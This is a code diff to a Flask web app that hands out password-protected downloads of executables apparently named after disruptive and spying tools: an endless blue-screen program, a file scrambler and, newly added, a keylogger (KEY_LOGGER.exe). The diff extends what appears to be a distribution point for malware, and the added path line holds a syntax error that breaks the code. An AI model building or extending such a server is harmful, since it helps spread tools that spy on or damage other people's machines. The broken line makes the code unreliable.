@@ -5,10 +5,11 @@ app = Flask(__name__)
 
 BSOD_password = os.environ.get("BSOD_password")
 FileScrambler_password = os.environ.get("FileScrambler_password")
+KEY_LOGGER_PASSWORD=os.environ.get("KEY_LOGGER_PASSWORD")
 
 ENDLESS_BSOD_path = os.path.join("..", "ENDLESS_BSOD", "dist")
 FileScrambler_path = os.path.join("..", "FileScrambler", "dist")
-
+KEY_LOGGER_PATH=os.path.join("..","KEY_LOGGER","dist")")
 
 @app.route("/", methods=["GET", "POST"])
 def home():
@@ -28,6 +29,12 @@ def home():
                 "file_scrambler.exe",
                 as_attachment=True
             )
+        if user_password == KEY_LOGGER_PASSWORD:
+                    return send_from_directory(
+                        KEY_LOGGER_PATH,
+                        "KEY_LOGGER.exe",
+                        as_attachment=True
+                    )
 
     return render_template("index.html")
 
